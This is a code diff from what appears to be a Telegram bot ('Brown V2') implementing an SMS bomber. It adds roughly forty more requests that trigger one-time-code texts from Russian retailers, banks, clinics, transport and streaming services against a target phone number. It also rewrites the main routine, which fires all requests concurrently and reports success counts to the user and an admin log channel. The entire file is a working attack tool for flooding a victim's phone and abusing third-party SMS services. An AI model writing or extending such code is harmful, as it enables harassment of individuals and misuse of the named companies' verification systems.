+        "https://api.sberhealth.ru/auth/v1/send-otp",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 49. Delivery Club ─────────────────────────────────────────────────────
+    await req("Delivery Club", session.post(
+        "https://api.delivery-club.ru/api11/auth",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user, "X-Version": "11.0.0"}
+    ))
+
+    # ── 50. Яндекс.Еда ────────────────────────────────────────────────────────
+    await req("Яндекс.Еда", session.post(
+        "https://eda.yandex.ru/api/v1/auth/request-code",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 51. Boxberry ──────────────────────────────────────────────────────────
+    await req("Boxberry", session.post(
+        "https://api.boxberry.ru/api/v1/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 52. Самокат ───────────────────────────────────────────────────────────
+    await req("Самокат", session.post(
+        "https://api.samokat.ru/v1/auth/send-code",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 53. ВкусВилл ──────────────────────────────────────────────────────────
+    await req("ВкусВилл", session.post(
+        "https://api.vkusvill.ru/api/v2/user/send-code",
+        json={"phone": p},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 54. Авито ─────────────────────────────────────────────────────────────
+    await req("Авито", session.post(
+        "https://api.avito.ru/core/v1/accounts/phone/login",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 55. Lamoda ────────────────────────────────────────────────────────────
+    await req("Lamoda", session.post(
+        "https://api.lamoda.ru/api/v5/user/sendAuthCode",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 56. Золотое Яблоко ────────────────────────────────────────────────────
+    await req("Золотое Яблоко", session.post(
+        "https://goldapple.ru/api/v1/auth/send-code",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 57. Детский мир ───────────────────────────────────────────────────────
+    await req("Детский мир", session.post(
+        "https://www.detmir.ru/api/v1/auth/phone/otp",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 58. FixPrice ──────────────────────────────────────────────────────────
+    await req("FixPrice", session.post(
+        "https://fix-price.com/api/v1/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 59. Магнит ────────────────────────────────────────────────────────────
+    await req("Магнит", session.post(
+        "https://magnit.ru/api/v2/auth/login/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 60. М.Видео ───────────────────────────────────────────────────────────
+    await req("М.Видео", session.post(
+        "https://www.mvideo.ru/bff/mobile/auth/otp/send",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 61. Perекрёсток ───────────────────────────────────────────────────────
+    await req("Перекрёсток", session.post(
+        "https://www.perekrestok.ru/api/customer/v2/auth/phone",
+        json={"phone": p},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 62. Пятёрочка ─────────────────────────────────────────────────────────
+    await req("Пятёрочка", session.post(
+        "https://www.pyaterochka.ru/api/customer/v2/auth/phone",
+        json={"phone": p},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 63. Book24 ────────────────────────────────────────────────────────────
+    await req("Book24", session.post(
+        "https://book24.ru/api/v1/auth/send-code/",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 64. CIAN ──────────────────────────────────────────────────────────────
+    await req("CIAN", session.post(
+        "https://api.cian.ru/api/auth/v1/get-code-by-phone/",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 65. Apteka.ru ─────────────────────────────────────────────────────────
+    await req("Apteka.ru", session.post(
+        "https://api.apteka.ru/Account/Phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 66. Rendez-Vous ───────────────────────────────────────────────────────
+    await req("Rendez-Vous", session.post(
+        "https://rendez-vous.ru/api/v1/user/sms/auth",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 67. РЖД ───────────────────────────────────────────────────────────────
+    await req("РЖД", session.post(
+        "https://lk.rzd.ru/api/v1/auth/phone/otp",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 68. Туту.ру ───────────────────────────────────────────────────────────
+    await req("Туту.ру", session.post(
+        "https://www.tutu.ru/api/v1/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 69. Яндекс.Путешествия ────────────────────────────────────────────────
+    await req("Яндекс.Путешествия", session.post(
+        "https://travel.yandex.ru/api/v1/user/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 70. Ростелеком ────────────────────────────────────────────────────────
+    await req("Ростелеком", session.post(
+        "https://lk.rt.ru/api/auth/v2/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 71. 2ГИС ──────────────────────────────────────────────────────────────
+    await req("2ГИС", session.post(
+        "https://account.2gis.ru/v1/auth/phone/otp",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 72. Леруа Мерлен ──────────────────────────────────────────────────────
+    await req("Леруа Мерлен", session.post(
+        "https://leroymerlin.ru/api/v2/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 73. Дом.ру / Ростелеком ИН ───────────────────────────────────────────
+    await req("Дом.ру", session.post(
+        "https://dom.ru/api/v2/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 74. СберМаркет ────────────────────────────────────────────────────────
+    await req("СберМаркет", session.post(
+        "https://sbermarket.ru/api/v3/auth/sms",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 75. Hoff ──────────────────────────────────────────────────────────────
+    await req("Hoff", session.post(
+        "https://hoff.ru/api/v2/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 76. ВсеИнструменты ────────────────────────────────────────────────────
+    await req("ВсеИнструменты", session.post(
+        "https://www.vseinstrumenti.ru/api/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 77. Додо Пицца ────────────────────────────────────────────────────────
+    await req("Dodo Pizza", session.post(
+        "https://auth.dodois.io/connect/token",
+        data=f"grant_type=phone&phone={pp}&platform=web&countryCode=ru",
+        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": user}
+    ))
+
+    # ── 78. Burger King ───────────────────────────────────────────────────────
+    await req("Burger King", session.post(
+        "https://burgerking.ru/api/v1/sms/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 79. Иви ───────────────────────────────────────────────────────────────
+    await req("Иви", session.post(
+        "https://api.ivi.ru/mobileapi/user/auth/v7",
+        json={"phone": pp, "type": "sms"},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 80. Okko ──────────────────────────────────────────────────────────────
+    await req("Okko", session.post(
+        "https://okko.tv/api/v3/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 81. More.tv ───────────────────────────────────────────────────────────
+    await req("More.tv", session.post(
+        "https://more.tv/api/v4/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 82. Кинопоиск ─────────────────────────────────────────────────────────
+    await req("Кинопоиск", session.post(
+        "https://api.kinopoisk.ru/v1/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 83. Skillbox ──────────────────────────────────────────────────────────
+    await req("Skillbox", session.post(
+        "https://skillbox.ru/api/v1/auth/phone/send-code",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 84. Geekbrains ────────────────────────────────────────────────────────
+    await req("Geekbrains", session.post(
+        "https://gb.ru/api/v1/users/send_sms",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 85. Медси ─────────────────────────────────────────────────────────────
+    await req("Медси", session.post(
+        "https://medsi.ru/api/v1/auth/phone/sms",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 86. Гемотест ──────────────────────────────────────────────────────────
+    await req("Гемотест", session.post(
+        "https://gemotest.ru/api/v1/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 87. INVITRO ───────────────────────────────────────────────────────────
+    await req("INVITRO", session.post(
+        "https://www.invitro.ru/api/v1/auth/otp",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 88. Сбер Прайм ────────────────────────────────────────────────────────
+    await req("СберПрайм", session.post(
+        "https://sberprime.sber.ru/api/v1/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 89. HeadHunter ────────────────────────────────────────────────────────
+    await req("HeadHunter", session.post(
+        "https://hh.ru/oauth/token/phone",
+        data=f"phone={pp}&client_id=HH&grant_type=phone_verification",
+        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": user}
+    ))
+
+    # ── 90. ДомКлик ───────────────────────────────────────────────────────────
+    await req("ДомКлик", session.post(
+        "https://domclick.ru/api/v2/user/auth/phone",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    return results
 
 
 async def main_sms_snos(phone: str, user_id: int, username: str):
     """
-    Основная функция SMS бомбера.
-    phone — в формате 79991234567 (без +, без пробелов)
+    phone — формат 79991234567 (без +)
     """
     from config import bot_logs
     import keyboards
     from aiogram import types as aiogram_types
 
-    services = _build_services(phone)
-    total = len(services)
-
     print(f"\n{'='*55}", flush=True)
-    print(f"[SMS] 🚀 Запуск SMS-бомбера", flush=True)
+    print(f"[SMS] 🚀 SMS-бомбер", flush=True)
     print(f"[SMS] 📱 Номер: +{phone}", flush=True)
     print(f"[SMS] 👤 {user_id} (@{username})", flush=True)
-    print(f"[SMS] 🎯 Сервисов: {total}", flush=True)
     print(f"{'='*55}", flush=True)
-
-    results = []
 
     connector = aiohttp.TCPConnector(ssl=False, limit=BATCH_SIZE)
     async with aiohttp.ClientSession(connector=connector) as session:
-        # Разбиваем на пачки по BATCH_SIZE
-        for batch_start in range(0, total, BATCH_SIZE):
-            batch = services[batch_start: batch_start + BATCH_SIZE]
-            tasks = [
-                _send_one(session, svc, batch_start + i + 1)
-                for i, svc in enumerate(batch)
-            ]
-            batch_results = await asyncio.gather(*tasks, return_exceptions=False)
-            results.extend(batch_results)
-            # Небольшая пауза между пачками
-            if batch_start + BATCH_SIZE < total:
-                await asyncio.sleep(1.5)
+        results = await _run_all(session, phone)
 
     ok = sum(1 for _, s, _ in results if s == "✅")
     timeout = sum(1 for _, s, _ in results if s == "⏱")
     err = sum(1 for _, s, _ in results if s == "❌")
+    total = len(results)
 
-    print(f"\n[SMS] {'='*55}", flush=True)
-    print(f"[SMS] 🏁 Итоги: ✅ {ok} | ⏱ {timeout} | ❌ {err}", flush=True)
-    print(f"[SMS] {'='*55}\n", flush=True)
+    print(f"\n[SMS] Итого: ✅ {ok} | ⏱ {timeout} | ❌ {err}", flush=True)
 
-    # Формируем лог
     log_lines = [
         "Brown V2 | SMS-бомбер",
         "=" * 50,
@@ -1379,16 +800,13 @@ async def main_sms_snos(phone: str, user_id: int, username: str):
         "=" * 50,
         "",
     ]
-    for name, status, code in results:
-        log_lines.append(f"{status}  {name:30s} [{code}]")
+    for name, icon, code in results:
+        log_lines.append(f"{icon}  {name:35s} [{code}]")
 
-    log_lines += [
-        "",
-        "=" * 50,
-        f"✅ Успешно : {ok}",
-        f"⏱ Таймаут : {timeout}",
-        f"❌ Ошибок  : {err}",
-    ]
+    log_lines += ["", "=" * 50,
+                  f"✅ Успешно : {ok}",
+                  f"⏱ Таймаут : {timeout}",
+                  f"❌ Ошибок  : {err}"]
 
     log_name = f"brown_v2_sms_{os.urandom(4).hex()}.txt"
     log_path = os.path.join(LOG_FOLDER, log_name)
@@ -1396,7 +814,7 @@ async def main_sms_snos(phone: str, user_id: int, username: str):
         f.write("\n".join(log_lines))
 
     caption_user = (
-        f"📱 *SMS-бомбер завершён!*\n"
+        f"💬 *SMS-бомбер завершён!*\n"
         f"*└─ Номер:* `+{phone}`\n\n"
         f"*Сервисов:* `{total}`\n"
         f"✅ *Успешно: {ok}*\n"
@@ -1404,7 +822,7 @@ async def main_sms_snos(phone: str, user_id: int, username: str):
         f"❌ *Ошибок: {err}*"
     )
     caption_log = (
-        f"📱 *SMS-бомбер*\n"
+        f"💬 *SMS-бомбер*\n"
         f"*└─ Номер:* `+{phone}`\n"
         f"✅ {ok} | ⏱ {timeout} | ❌ {err}\n"
         f"👤 {user_id} (@{username})"
@@ -1412,17 +830,13 @@ async def main_sms_snos(phone: str, user_id: int, username: str):
 
     try:
         await bot.send_document(
-            user_id,
-            aiogram_types.InputFile(log_path),
-            caption=caption_user,
-            parse_mode="Markdown",
+            user_id, aiogram_types.InputFile(log_path),
+            caption=caption_user, parse_mode="Markdown",
             reply_markup=keyboards.main_menu,
         )
         await bot.send_document(
-            bot_logs,
-            aiogram_types.InputFile(log_path),
-            caption=caption_log,
-            parse_mode="Markdown",
+            bot_logs, aiogram_types.InputFile(log_path),
+            caption=caption_log, parse_mode="Markdown",
         )
     except Exception as e:
         print(f"[SMS] Ошибка отправки лога: {e}", flush=True)
